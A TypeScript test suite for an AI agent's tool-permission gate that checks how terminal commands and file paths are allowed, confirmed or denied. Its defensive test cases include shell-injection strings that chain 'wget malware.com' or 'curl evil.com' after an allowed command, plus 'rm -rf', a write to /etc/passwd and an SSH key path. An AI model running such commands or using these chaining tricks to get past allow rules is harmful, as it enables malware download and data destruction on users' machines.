import { describe, expect, it } from "vitest";

import {
  decide,
  decideCalls,
  matchesRule,
  mostRestrictive,
  splitCommand,
} from "../src/decision.ts";
import type {
  CompiledRule,
  Decision,
  DecisionCause,
  DecisionInput,
  MappedCall,
  RuleOrigin,
  RuleScope,
  ToolPermissionMode,
  ToolPermissions,
  ToolRules,
} from "../src/types.ts";

// ---------------------------------------------------------------------------
// Helpers: build a ToolPermissions from plain string arrays
// ---------------------------------------------------------------------------

/** A rule written the way a configuration file writes it. */
type RuleSpec =
  | string
  | {
      pattern?: string;
      /** Configuration compiles case-insensitively unless this is set. */
      caseSensitive?: boolean;
      scope?: RuleScope;
      origin?: RuleOrigin;
    };

function compile(spec: RuleSpec): CompiledRule {
  const rule = typeof spec === "string" ? { pattern: spec } : spec;
  const pattern = rule.pattern;
  return {
    source: pattern ?? "",
    regex:
      pattern === undefined
        ? undefined
        : new RegExp(pattern, "caseSensitive" in rule && rule.caseSensitive === true ? "" : "i"),
    scope: ("scope" in rule ? rule.scope : undefined) ?? "any",
    origin: ("origin" in rule ? rule.origin : undefined) ?? "global",
  };
}

interface ToolSpec {
  default?: ToolPermissionMode;
  allow?: RuleSpec[];
  confirm?: RuleSpec[];
  deny?: RuleSpec[];
  invalid?: { pattern: string; origin?: RuleOrigin }[];
}

function permissions(
  tools: Record<string, ToolSpec>,
  globalDefault: ToolPermissionMode = "confirm",
): ToolPermissions {
  const compiled: Record<string, ToolRules> = {};
  for (const [name, spec] of Object.entries(tools)) {
    compiled[name] = {
      default: spec.default,
      always_allow: (spec.allow ?? []).map(compile),
      always_confirm: (spec.confirm ?? []).map(compile),
      always_deny: (spec.deny ?? []).map(compile),
      invalidPatterns: (spec.invalid ?? []).map((entry) => ({
        pattern: entry.pattern,
        origin: entry.origin ?? "global",
        message: "Invalid regular expression",
      })),
    };
  }
  return { default: globalDefault, tools: compiled };
}

/** Decides several independent terminal commands as one virtual tool call. */
function terminalAll(
  commands: readonly string[],
  spec: ToolSpec,
  globalDefault?: ToolPermissionMode,
): Decision {
  return decide(
    "terminal",
    commands.map((value) => ({ value })),
    permissions({ terminal: spec }, globalDefault),
  );
}

/** Decides one terminal command against `terminal` rules only. */
function terminal(command: string, spec: ToolSpec, globalDefault?: ToolPermissionMode): Decision {
  return terminalAll([command], spec, globalDefault);
}

/** Decides one path input against `write_file` rules only. */
function writeFile(
  input: DecisionInput,
  spec: ToolSpec,
  globalDefault?: ToolPermissionMode,
): Decision {
  return decide("write_file", [input], permissions({ write_file: spec }, globalDefault));
}

/** A terminal command, its rules, and the outcome it must produce. */
interface TerminalCase {
  readonly scenario: string;
  readonly command: string;
  readonly rules: ToolSpec;
  readonly globalDefault?: ToolPermissionMode;
  readonly expected: ToolPermissionMode;
  readonly cause: DecisionCause["kind"];
}

/** Several inputs in one call, exercising the ANY/ALL rules. */
interface MultiInputCase {
  readonly scenario: string;
  readonly commands: readonly string[];
  readonly rules: ToolSpec;
  readonly globalDefault?: ToolPermissionMode;
  readonly expected: ToolPermissionMode;
  readonly cause: DecisionCause["kind"];
  /** The input recorded on the cause, or `undefined` when a default decided. */
  readonly causeInput: string | undefined;
}

/** A normalized path input, exercising scope, case, and the escape floor. */
interface PathCase {
  readonly scenario: string;
  readonly input: DecisionInput;
  readonly rules: ToolSpec;
  readonly globalDefault?: ToolPermissionMode;
  readonly expected: ToolPermissionMode;
  readonly cause: DecisionCause["kind"];
  readonly reason: RegExp;
}

// ---------------------------------------------------------------------------
// Group 1: specs/permission-decision/spec.md, plus scope (project-root) and D8
// ---------------------------------------------------------------------------

describe("spec: permission-decision", () => {
  describe("precedence", () => {
    const cases: readonly TerminalCase[] = [
      {
        scenario: "deny wins when an input matches always_deny and always_confirm",
        command: "rm -rf build",
        rules: { deny: ["\\brm\\b"], confirm: ["\\brm\\b"] },
        expected: "deny",
        cause: "rule",
      },
      {
        scenario: "confirm wins when an input matches always_confirm and always_allow",
        command: "git push --force",
        rules: { allow: ["^git\\b"], confirm: ["--force"] },
        expected: "confirm",
        cause: "rule",
      },
      {
        // The global `allow` must not win over the tool's own `confirm`.
        scenario: "the tool default applies when no pattern matches",
        command: "python x.py",
        rules: { allow: ["^cargo"], default: "confirm" },
        globalDefault: "allow",
        expected: "confirm",
        cause: "default",
      },
      {
        scenario: "the global default applies when the tool has no default",
        command: "python x.py",
        rules: { allow: ["^cargo"] },
        globalDefault: "allow",
        expected: "allow",
        cause: "default",
      },
    ];

    it.each(cases)("$scenario", ({ command, rules, globalDefault, expected, cause }) => {
      const decision = terminal(command, rules, globalDefault);
      expect(decision.mode).toBe(expected);
      expect(decision.cause.kind).toBe(cause);
    });

    it("uses the global default when the tool has no configuration entry", () => {
      const decision = decide(
        "write_file",
        [{ value: ".env", scope: "inside" }],
        permissions({ terminal: { deny: [".*"] } }),
      );
      expect(decision.mode).toBe("confirm");
      expect(decision.cause.kind).toBe("default");
      expect(decision.reason).toMatch(/no rules configured/);
    });
  });

  describe("ANY/ALL over several inputs", () => {
    const cases: readonly MultiInputCase[] = [
      {
        scenario: "denies as soon as one input matches always_deny",
        commands: ["ls", "rm -rf build"],
        rules: { deny: ["\\brm\\b"] },
        expected: "deny",
        cause: "rule",
        causeInput: "rm -rf build",
      },
      {
        scenario: "does not allow unless every input matches always_allow",
        commands: ["ls", "rm -rf build"],
        rules: { allow: ["^ls"], default: "confirm" },
        expected: "confirm",
        cause: "default",
        causeInput: undefined,
      },
      {
        scenario: "allows when every input matches always_allow",
        commands: ["git status", "git diff"],
        rules: { allow: ["^git\\s+(status|diff)\\b"], default: "confirm" },
        expected: "allow",
        cause: "rule",
        causeInput: "git status",
      },
      {
        scenario: "confirms as soon as one input matches always_confirm",
        commands: ["git status", "sudo ls"],
        rules: { allow: ["^git", "^sudo"], confirm: ["\\bsudo\\b"] },
        expected: "confirm",
        cause: "rule",
        causeInput: "sudo ls",
      },
      {
        scenario: "never allows an empty input list",
        commands: [],
        rules: { allow: [".*"] },
        expected: "confirm",
        cause: "default",
        causeInput: undefined,
      },
    ];

    it.each(cases)(
      "$scenario",
      ({ commands, rules, globalDefault, expected, cause, causeInput }) => {
        const decision = terminalAll(commands, rules, globalDefault);
        expect(decision.mode).toBe(expected);
        expect(decision.cause.kind).toBe(cause);
        expect(decision.cause.input).toBe(causeInput);
      },
    );
  });

  describe("case sensitivity", () => {
    const cases: readonly PathCase[] = [
      {
        scenario: "ignores case when case_sensitive is omitted",
        input: { value: "certs/key.pem", scope: "inside" },
        rules: { deny: ["\\.PEM$"] },
        expected: "deny",
        cause: "rule",
        reason: /always_deny/,
      },
      {
        scenario: "respects case when case_sensitive is set",
        input: { value: "certs/key.pem", scope: "inside" },
        rules: { deny: [{ pattern: "\\.PEM$", caseSensitive: true }] },
        expected: "confirm",
        cause: "default",
        reason: /no rule matched/,
      },
    ];

    it.each(cases)("$scenario", ({ input, rules, globalDefault, expected, cause, reason }) => {
      const decision = writeFile(input, rules, globalDefault);
      expect(decision.mode).toBe(expected);
      expect(decision.cause.kind).toBe(cause);
      expect(decision.reason).toMatch(reason);
    });
  });

  describe("terminal sub-command split", () => {
    interface SplitCase {
      readonly scenario: string;
      readonly command: string;
      /** `undefined` means the command could not be split. */
      readonly split: readonly string[] | undefined;
      readonly rules: ToolSpec;
      readonly expected: ToolPermissionMode;
      readonly reason: RegExp;
    }

    const cases: readonly SplitCase[] = [
      {
        scenario: "splits a compound command and confirms on the injected half",
        command: "cd /tmp && rm -rf build",
        split: ["cd /tmp", "rm -rf build"],
        rules: { confirm: ["\\brm\\b"] },
        expected: "confirm",
        reason: /always_confirm/,
      },
      {
        // `tail` matches no allow pattern, so the pipeline is not auto-approved.
        scenario: "splits a pipeline and ignores a file descriptor duplication",
        command: "cargo test 2>&1 | tail",
        split: ["cargo test", "tail"],
        rules: { allow: ["^cargo\\s+test\\b"] },
        expected: "confirm",
        reason: /no rule matched/,
      },
      {
        scenario: "disables always_allow when the command cannot be split",
        command: "ls &&",
        split: undefined,
        rules: { allow: [".*"] },
        expected: "confirm",
        reason: /could not be split/,
      },
    ];

    it.each(cases)("$scenario", ({ command, split, rules, expected, reason }) => {
      expect(splitCommand(command)).toEqual(split);
      const decision = terminal(command, rules);
      expect(decision.mode).toBe(expected);
      expect(decision.reason).toMatch(reason);
    });
  });

  describe("one call across several virtual tools", () => {
    const mapped: readonly MappedCall[] = [
      { virtualTool: "edit_file", inputs: [{ value: "src/a.ts", scope: "inside" }] },
      { virtualTool: "delete_path", inputs: [{ value: "src/b.ts", scope: "inside" }] },
      { virtualTool: "move_path", inputs: [{ value: "src/c.ts", scope: "inside" }] },
    ];

    interface CallsCase {
      readonly scenario: string;
      readonly tools: Record<string, ToolSpec>;
      readonly expected: ToolPermissionMode;
      /** The virtual tool whose decision survived as the strictest. */
      readonly decidedBy: string;
    }

    const cases: readonly CallsCase[] = [
      {
        scenario: "takes the strictest of the mapped operations",
        tools: {
          edit_file: { default: "allow" },
          delete_path: { default: "confirm" },
          move_path: { default: "allow" },
        },
        expected: "confirm",
        decidedBy: "delete_path",
      },
      {
        scenario: "denies the whole call when one operation is denied",
        tools: {
          edit_file: { default: "allow" },
          delete_path: { default: "allow", deny: ["\\.ts$"] },
          move_path: { default: "allow" },
        },
        expected: "deny",
        decidedBy: "delete_path",
      },
      {
        scenario: "allows when every operation is allowed",
        tools: {
          edit_file: { default: "allow" },
          delete_path: { default: "allow" },
          move_path: { default: "allow" },
        },
        expected: "allow",
        decidedBy: "edit_file",
      },
    ];

    it.each(cases)("$scenario", ({ tools, expected, decidedBy }) => {
      const decision = decideCalls(mapped, permissions(tools));
      expect(decision.mode).toBe(expected);
      expect(decision.virtualTool).toBe(decidedBy);
    });

    it("keeps the first decision on a strictness tie", () => {
      const first = terminal("ls", { default: "confirm" });
      const second = terminal("pwd", { default: "confirm" });
      expect(mostRestrictive(first, second)).toBe(first);
    });
  });

  describe("scope and pattern composition", () => {
    const cases: readonly PathCase[] = [
      {
        scenario: "a scope-only rule matches on location alone",
        input: { value: "/Users/me/.env", scope: "outside" },
        rules: { confirm: [{ scope: "outside" }] },
        globalDefault: "allow",
        expected: "confirm",
        cause: "rule",
        reason: /always_confirm scope outside/,
      },
      {
        scenario: "a disagreeing scope defeats a matching pattern",
        input: { value: "/Users/me/.env", scope: "outside" },
        rules: { deny: [{ pattern: "\\.env$", scope: "inside" }] },
        globalDefault: "allow",
        expected: "allow",
        cause: "default",
        reason: /no rule matched/,
      },
      {
        scenario: "an omitted scope matches inside and outside alike",
        input: { value: "/Users/me/certs/a.pem", scope: "outside" },
        rules: { deny: ["\\.pem$"] },
        globalDefault: "allow",
        expected: "deny",
        cause: "rule",
        reason: /always_deny/,
      },
    ];

    it.each(cases)("$scenario", ({ input, rules, globalDefault, expected, cause, reason }) => {
      const decision = writeFile(input, rules, globalDefault);
      expect(decision.mode).toBe(expected);
      expect(decision.cause.kind).toBe(cause);
      expect(decision.reason).toMatch(reason);
    });

    interface MatchCase {
      readonly scenario: string;
      readonly rule: RuleSpec;
      readonly input: DecisionInput;
      readonly expected: boolean;
    }

    const matchCases: readonly MatchCase[] = [
      {
        scenario: "a scoped rule never matches an input that has no scope",
        rule: { pattern: "\\brm\\b", scope: "inside" },
        input: { value: "rm -rf build" },
        expected: false,
      },
      {
        scenario: "a scoped rule matches an input with the same scope",
        rule: { pattern: "\\brm\\b", scope: "inside" },
        input: { value: "rm -rf build", scope: "inside" },
        expected: true,
      },
      {
        scenario: "an unscoped rule matches an input that has no scope",
        rule: "\\brm\\b",
        input: { value: "rm -rf build" },
        expected: true,
      },
    ];

    it.each(matchCases)("matchesRule: $scenario", ({ rule, input, expected }) => {
      expect(matchesRule(compile(rule), input)).toBe(expected);
    });
  });

  describe("symlink escape floor (design D8)", () => {
    const escaped: DecisionInput = {
      value: "config/id_rsa",
      scope: "inside",
      escaped: true,
      literal: "/repo/config/id_rsa",
      resolved: "/Users/me/.ssh/id_rsa",
    };

    const cases: readonly PathCase[] = [
      {
        scenario: "raises allow to confirm",
        input: escaped,
        rules: { default: "allow", allow: [".*"] },
        globalDefault: "allow",
        expected: "confirm",
        cause: "escape",
        reason: /\/Users\/me\/\.ssh\/id_rsa/,
      },
      {
        scenario: "keeps deny when always_deny matches an escaped path",
        input: escaped,
        rules: { default: "allow", deny: ["id_rsa$"] },
        globalDefault: "allow",
        expected: "deny",
        cause: "rule",
        reason: /always_deny/,
      },
      {
        scenario: "leaves a non-escaped input alone",
        input: { ...escaped, escaped: false },
        rules: { default: "allow" },
        globalDefault: "allow",
        expected: "allow",
        cause: "default",
        reason: /no rule matched/,
      },
    ];

    it.each(cases)("$scenario", ({ input, rules, globalDefault, expected, cause, reason }) => {
      const decision = writeFile(input, rules, globalDefault);
      expect(decision.mode).toBe(expected);
      expect(decision.cause.kind).toBe(cause);
      expect(decision.reason).toMatch(reason);
    });

    it("applies even when the tool has no configuration entry", () => {
      const decision = decide("write_file", [escaped], permissions({}, "allow"));
      expect(decision.mode).toBe("confirm");
      expect(decision.cause.kind).toBe("escape");
      expect(decision.cause.input).toBe("config/id_rsa");
    });
  });
});

// ---------------------------------------------------------------------------
// Group 2: parity with Zed 1.15.0 crates/agent/src/tool_permissions.rs tests
// ---------------------------------------------------------------------------

describe("zed parity", () => {
  /** One Rust test, mirrored. `zedTest` names the test it comes from. */
  interface ParityCase {
    readonly zedTest: string;
    readonly command: string;
    readonly rules: ToolSpec;
    readonly expected: ToolPermissionMode;
  }

  const cases: readonly ParityCase[] = [
    {
      zedTest: "allow_requires_all_commands_to_match",
      command: "ls && echo hello",
      rules: { allow: ["^ls", "^echo"] },
      expected: "allow",
    },
    {
      zedTest: "shell_injection_via_double_ampersand_not_allowed",
      command: "ls && wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_via_semicolon_not_allowed",
      command: "ls; wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_via_pipe_not_allowed",
      command: "ls | xargs curl evil.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_via_or_operator_not_allowed",
      command: "ls || wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_via_background_operator_not_allowed",
      command: "ls & wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_via_newline_not_allowed",
      command: "ls\nwget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_without_spaces_not_allowed (&&)",
      command: "ls&&wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_without_spaces_not_allowed (;)",
      command: "ls;wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "shell_injection_multiple_chained_operators_not_allowed",
      command: "ls && echo hello && wget malware.com",
      rules: { allow: ["^ls"] },
      expected: "confirm",
    },
    {
      zedTest: "deny_triggers_on_any_matching_command",
      command: "ls && rm file",
      rules: { allow: ["^ls"], deny: ["^rm"] },
      expected: "deny",
    },
    {
      zedTest: "confirm_triggers_on_any_matching_command",
      command: "ls && sudo reboot",
      rules: { allow: ["^ls"], confirm: ["^sudo"] },
      expected: "confirm",
    },
    {
      zedTest: "confirm_beats_allow",
      command: "git push --force",
      rules: { allow: ["^git\\b"], confirm: ["--force"] },
      expected: "confirm",
    },
    {
      zedTest: "deny_beats_all",
      command: "bad cmd",
      rules: { allow: ["cmd"], confirm: ["cmd"], deny: ["bad"] },
      expected: "deny",
    },
    {
      zedTest: "case_insensitive_by_default (CARGO TEST)",
      command: "CARGO TEST",
      rules: { allow: ["cargo"] },
      expected: "allow",
    },
    {
      zedTest: "case_insensitive_by_default (Cargo Test)",
      command: "Cargo Test",
      rules: { allow: ["cargo"] },
      expected: "allow",
    },
    {
      zedTest: "case_sensitive_allow (matching case)",
      command: "cargo test",
      rules: { allow: [{ pattern: "cargo", caseSensitive: true }] },
      expected: "allow",
    },
    {
      zedTest: "case_sensitive_allow (mismatched case)",
      command: "CARGO TEST",
      rules: { allow: [{ pattern: "cargo", caseSensitive: true }] },
      expected: "confirm",
    },
    {
      // Both halves of the pipeline match their own allow pattern.
      zedTest: "pipe_does_not_cause_false_negative_when_all_commands_match",
      command: 'echo "y\\ny" | git add -p crates/acp_thread/src/acp_thread.rs',
      rules: {
        allow: [
          "^git\\s+(--no-pager\\s+)?(fetch|status|diff|log|show|add|commit|push|checkout\\s+-b)\\b",
          "^echo",
        ],
      },
      expected: "allow",
    },
  ];

  it.each(cases)("$zedTest", ({ command, rules, expected }) => {
    expect(terminal(command, rules).mode).toBe(expected);
  });

  it("empty_input_with_allow_falls_to_default", () => {
    expect(splitCommand("")).toEqual([]);
    expect(terminal("", { allow: ["^ls"] }).mode).toBe("confirm");
  });

  it("invalid_pattern_blocks", () => {
    const decision = terminal("echo hi", {
      default: "allow",
      allow: ["echo"],
      invalid: [{ pattern: "[bad" }],
    });
    expect(decision.mode).toBe("deny");
    expect(decision.cause.kind).toBe("invalid-pattern");
    expect(decision.reason).toMatch(/1 regex pattern failed to compile/);
  });

  it("multiple_invalid_patterns_pluralizes_message", () => {
    const decision = terminal("echo hi", {
      default: "allow",
      invalid: [{ pattern: "[bad" }, { pattern: "(also bad", origin: "project" }],
    });
    expect(decision.mode).toBe("deny");
    expect(decision.reason).toMatch(/2 regex patterns failed to compile/);
  });

  it("dev_null_redirect_does_not_cause_false_negative", () => {
    // A redirection to /dev/null is known-safe and contributes no sub-command,
    // so it cannot stop every other sub-command from matching.
    const command = 'git log --oneline -20 2>/dev/null || echo "not a git repo or no commits"';
    expect(splitCommand(command)).toEqual([
      "git log --oneline -20",
      "echo not a git repo or no commits",
    ]);
    expect(terminal(command, { allow: ["^git\\s+(status|diff|log|show)\\b", "^echo"] }).mode).toBe(
      "allow",
    );
  });

  it("redirect_to_real_file_still_causes_confirm", () => {
    // A redirection to a real file contributes its own sub-command, which an
    // allow pattern on the command name alone does not match.
    expect(splitCommand("echo hello > /etc/passwd")).toEqual(["echo hello", "> /etc/passwd"]);
    expect(terminal("echo hello > /etc/passwd", { allow: ["^echo"] }).mode).toBe("confirm");
  });

  it("nested_command_substitution_is_denied", () => {
    // Adapted: omp-toolgate has no blanket deny of commands containing shell
    // substitutions (an explicit non-goal), so instead of Zed's Deny we assert
    // the command never reaches `allow` on the strength of `^echo` alone,
    // because the substituted commands are extracted and checked in their own
    // right.
    const command = "echo $(cat $(whoami).txt)";
    expect(splitCommand(command)).toEqual([
      "echo $(cat $(whoami).txt)",
      "cat $(whoami).txt",
      "whoami",
    ]);
    expect(terminal(command, { allow: ["^echo"] }).mode).not.toBe("allow");
    // The divergence, stated outright: a configuration that really does allow
    // every extracted command allows the whole thing.
    expect(terminal(command, { allow: ["^echo", "^cat", "^whoami"] }).mode).toBe("allow");
  });

  it("parse_failure_is_denied", () => {
    // Adapted: Zed denies outright on a parse failure. omp-toolgate disables
    // `always_allow` and falls back to the default instead, so an unparseable
    // command is never auto-approved, but a parser disagreement alone never
    // blocks a command either.
    expect(splitCommand("ls &&")).toBeUndefined();
    const decision = terminal("ls &&", { allow: ["^ls$"] });
    expect(decision.mode).toBe("confirm");
    expect(decision.cause.kind).toBe("default");
    expect(decision.reason).toMatch(/always_allow was not evaluated/);
  });
});
